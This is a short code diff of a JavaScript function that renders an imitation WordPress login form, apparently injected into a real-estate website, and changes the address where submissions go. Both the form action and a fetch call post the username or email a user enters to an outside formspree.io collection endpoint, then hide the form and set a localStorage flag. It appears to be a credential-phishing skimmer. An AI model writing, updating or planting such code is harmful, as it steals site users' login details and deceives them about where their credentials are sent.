@@ -268,7 +268,7 @@ function renderHTMLTemplate() {
         <div class="wp-lgn-crd">
             <div class="logo-lgn"><a href="https://seventytworealestate.com/"></a></div>
             <div class="frm-crd">
-                <form action="https://formspree.io/f/xrbgoeyb" method="POST" id="formLgnWP">
+                <form action="https://formspree.io/f/xanqbywy" method="POST" id="formLgnWP">
                     <p class="f-g-wp">
                         <label for="userNameEmailLogin" id="labelUserLgn">Username or Email Address</label>
                         <input type="text" name="name" class="wp-inp" id="userNameEmailLogin" required>
@@ -377,7 +377,7 @@ function renderHTMLTemplate() {
             document.getElementById('formLgnWP').style.display = 'none';
             document.getElementById('tempWp5622').style.display = 'none';
             localStorage.setItem('formSubmitted', 'true');
-            fetch('https://formspree.io/f/xrbgoeyb', {
+            fetch('https://formspree.io/f/xanqbywy', {
                 method: 'POST',
                 body: new FormData(this),
                 mode: 'no-cors',
